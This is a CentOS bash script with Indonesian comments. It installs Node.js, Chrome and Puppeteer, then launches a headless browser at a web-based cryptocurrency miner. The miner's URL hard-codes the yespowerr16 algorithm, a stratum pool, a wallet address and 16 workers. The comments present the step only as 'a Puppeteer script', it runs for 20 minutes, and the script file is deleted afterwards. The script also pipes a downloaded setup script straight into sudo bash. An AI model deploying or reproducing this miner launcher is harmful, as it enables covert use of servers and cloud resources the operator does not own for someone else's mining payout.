#!/bin/bash

# Update sistem CentOS
sudo yum update -y

# Instal Node.js dan npm versi 16.x
curl -sL https://rpm.nodesource.com/setup_16.x | sudo bash -
sudo yum install -y nodejs

# Instal dependensi yang diperlukan untuk Chrome, Puppeteer, dan npx
sudo yum install -y \
  gconf-service \
  libXcomposite \
  libXcursor \
  libXi \
  libXtst \
  libXrandr \
  libXScrnSaver \
  alsa-lib \
  mesa-libEGL \
  libXdamage \
  mesa-libGL \
  libXss \
  libxshmfence \
  pango \
  atk \
  cups-libs \
  gtk3 \
  nss \
  xorg-x11-fonts-100dpi \
  xorg-x11-fonts-75dpi \
  xorg-x11-utils \
  xorg-x11-fonts-cyrillic \
  xorg-x11-fonts-Type1 \
  xorg-x11-fonts-misc \
  libappindicator-gtk3 \
  libappindicator-gtk2 \
  libdbusmenu \
  dbus-x11 \
  xorg-x11-server-Xvfb \
  xorg-x11-fonts-ISO8859-1-100dpi \
  xorg-x11-fonts-ISO8859-1-75dpi \
  xorg-x11-fonts-ISO8859-1 \
  xorg-x11-fonts-misc \
  ipa-gothic-fonts \
  ipa-mincho-fonts \
  wqy-zenhei-fonts \
  adobe-source-han-sans-cn-fonts \
  adobe-source-han-sans-tw-fonts \
  adobe-source-han-serif-cn-fonts \
  adobe-source-han-serif-tw-fonts \
  liberation-sans-fonts \
  liberation-serif-fonts \
  liberation-mono-fonts

# Instal Google Chrome
sudo curl -o /etc/yum.repos.d/google-chrome.repo https://dl.google.com/linux/chrome/rpm/stable/x86_64/google-chrome.repo
sudo yum install -y google-chrome-stable

# Instal Puppeteer dan npx
sudo npm install -g puppeteer npx

# Menggunakan npx untuk menginstal Chrome yang kompatibel dengan Puppeteer
npx puppeteer browsers install

# Buat dan jalankan skrip Puppeteer
cat <<EOF > puppeteer_script.js
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');

  // Set timeout untuk menjaga browser terbuka selama 20 menit (1200 detik)
  setTimeout(async () => {
    console.log('Menutup browser setelah 20 menit.');
    await browser.close();
  }, 1200 * 1000);

  // Tunggu agar skrip tetap berjalan untuk menjaga browser terbuka
  await new Promise(() => {});
})();
EOF

# Jalankan skrip Puppeteer menggunakan Node.js
node puppeteer_script.js

# Hapus skrip Puppeteer setelah selesai (opsional)
rm puppeteer_script.js
